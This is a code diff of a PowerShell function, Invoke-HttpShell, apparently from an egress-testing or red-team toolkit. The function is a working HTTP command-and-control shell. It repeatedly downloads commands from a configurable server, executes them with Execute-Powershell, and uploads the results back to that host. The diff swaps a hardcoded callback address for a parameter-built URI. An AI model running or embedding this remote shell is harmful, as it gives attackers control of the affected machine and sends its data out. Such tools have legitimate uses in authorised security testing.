@@ -12,15 +12,15 @@ function Invoke-HttpShell
     Due to processing overhead in Powershell, numbers are created in batches of 5,000.
     Reference: http://powershell.org/wp/2013/09/16/powershell-performance-the-operator-and-when-to-avoid-it/
 
-.Parameter IP
-    The string containing the IP or hostname of the egress assess server
+.Parameter SERVER
+    The string containing the server or hostname of the egress assess server
 
 .Parameter PORT
     The string containing the port to communicate over
 
 .Example
     Import-Module HTTP-Shell.ps1
-    Invoke-HttpShell -IP 127.0.0.1 -PORT 80
+    Invoke-HttpShell -SERVER 127.0.0.1 -PORT 80
 
 #>
     [CmdletBinding()]
@@ -59,7 +59,8 @@ function Invoke-HttpShell
         $sleep = 2
 
         while ($True) {
-            $command = $wc.DownloadString("http://" + $Server + ":" + $Port + "/")
+            $uri = "http://" + $Server + ":" + $Port + "/"
+            $command = $wc.DownloadString($uri)
             if ($command) {
                 if ($command -like "checkin") {
                     $results = "Checking in..."
@@ -71,7 +72,7 @@ function Invoke-HttpShell
                 } else {
                     $results = Execute-Powershell $command
                 }
-                $wc.UploadString('http://172.16.239.1:80/index.aspx', "POST", $results)
+                $wc.UploadString($uri + "index.aspx", "POST", $results)
                 $command = $results = [string]::empty
             }
             Start-Sleep -Seconds $sleep
